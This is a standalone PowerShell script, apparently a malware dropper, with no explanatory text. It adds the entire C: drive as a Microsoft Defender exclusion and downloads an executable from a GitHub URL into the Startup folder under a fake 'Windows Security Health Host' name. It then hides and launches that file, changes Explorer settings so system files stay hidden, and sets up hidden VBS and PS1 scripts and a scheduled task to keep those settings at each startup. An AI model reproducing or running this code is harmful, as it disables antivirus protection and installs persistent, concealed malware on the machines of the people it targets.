Add-MpPreference -ExclusionPath "C:\"
Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/vibha000x7/ViaProxy-3.3.3-Java8/refs/heads/main/test.exe' -OutFile "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\Windows Security Health Host.exe"
Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" -Name "Hidden" -Value 1
Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" -Name "ShowSuperHidden" -Value 0
attrib +s +h "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\Windows Security Health Host.exe"
Start-Process "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\Windows Security Health Host.exe"
$psScriptContent = @'
Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" -Name "ShowSuperHidden" -Value 0
'@
Set-Content -Path "C:\ProgramData\DisableShowSuperHidden.ps1" -Value $psScriptContent
$vbsScriptContent = @'
Set objShell = CreateObject("Wscript.Shell")
objShell.Run "powershell.exe -NoProfile -ExecutionPolicy Bypass -File C:\ProgramData\DisableShowSuperHidden.ps1", 0, True
'@
Set-Content -Path "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\WindowsUI.vbs" -Value $vbsScriptContent
$taskName = "DisableShowSuperHidden"
$action = New-ScheduledTaskAction -Execute "wscript.exe" -Argument $vbsScriptPath
$trigger = New-ScheduledTaskTrigger -AtStartup
Register-ScheduledTask -Action $action -Trigger $trigger -TaskName $taskName -Description "Disable ShowSuperHidden at startup"
attrib +s +h "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\WindowsUI.vbs"
attrib +s +h "C:\ProgramData\DisableShowSuperHidden.ps1"
